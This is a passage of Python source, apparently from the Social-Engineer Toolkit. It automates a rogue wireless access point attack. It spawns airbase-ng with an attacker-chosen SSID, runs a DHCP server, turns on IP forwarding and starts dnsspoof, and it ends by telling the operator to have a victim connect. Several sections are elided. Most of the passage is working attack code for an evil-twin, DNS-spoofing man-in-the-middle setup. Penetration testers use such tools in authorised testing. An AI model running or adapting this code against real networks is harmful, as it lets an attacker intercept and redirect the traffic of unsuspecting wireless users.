...
if not os.path.isfile(dnsspoof_path):
    if os.path.isfile("/usr/local/sbin/dnsspoof"):
        ...
        setcore.PrintWarning("DNSSpoof was not found. Please install or correct path in set_config. Exiting....")
        ExitSet()

if not os.path.isfile(airbase_path):
    airbase_path = "src/wireless/airbase-ng"

setcore.PrintInfo("For this attack to work properly, we must edit the dhcp3-server file to include our wireless interface.")
setcore.PrintInfo("""This will allow dhcp3 to properly assign IPs. (INTERFACES="at0")""")
print("")
setcore.PrintStatus("SET will now launch nano to edit the file.")
setcore.PrintStatus("Press ^X to exit nano and don't forget to save the updated file!")
setcore.PrintWarning("If you receive an empty file in nano, please check the path of your dhcp3-server file!")
...
show_fakeap_dhcp_menu = setcore.CreateMenu(text.fakeap_dhcp_text, text.fakeap_dhcp_menu)
fakeap_dhcp_menu_choice = raw_input(setcore.setprompt(["8"], ""))

if fakeap_dhcp_menu_choice != "":
	fakeap_dhcp_menu_choice = setcore.check_length(fakeap_dhcp_menu_choice,2)
...
if fakeap_dhcp_menu_choice == "1":
	...
	setcore.PrintStatus("Writing the dhcp configuration file to src/program_junk")
...
interface = raw_input(setcore.setprompt(["8"], "Enter the wireless network interface (ex. wlan0)"))

# place wifi interface into monitor mode
setcore.PrintStatus("Placing card in monitor mode via airmon-ng..")
...
setcore.PrintStatus("Spawning airbase-ng in a seperate child thread...")
child = pexpect.spawn('%s -P -C 20 -e "%s" -c %s %s' % (airbase_path,access_point,ap_channel,moniface))
setcore.PrintInfo("Sleeping 15 seconds waiting for airbase-ng to complete...")
time.sleep(15)

# bring the interface up
if dhcptun==1:
	setcore.PrintStatus("Bringing up the access point interface...")
...
setcore.PrintStatus("Starting the DHCP server on a seperate child thread...")
child2 = pexpect.spawn("dhcpd3 -q -cf src/program_junk/dhcp.conf -pf /var/run/dhcp3-server/dhcpd.pid at0")

# starts ip_forwarding
setcore.PrintStatus("Starting IP Forwarding...")
child3 = pexpect.spawn("echo 1 > /proc/sys/net/ipv4/ip_forward")

# start dnsspoof
setcore.PrintStatus("Starting DNSSpoof in a seperate child thread...")
child4 = pexpect.spawn("%s -i at0" % (dnsspoof_path))

setcore.PrintStatus("SET has finished creating the attack. If you experienced issues please report them.")
setcore.PrintStatus("Now launch SET attack vectors within the menus and have a victim connect via wireless.")
setcore.PrintStatus("Be sure to come back to this menu to stop the services once your finished.")
setcore.ReturnContinue()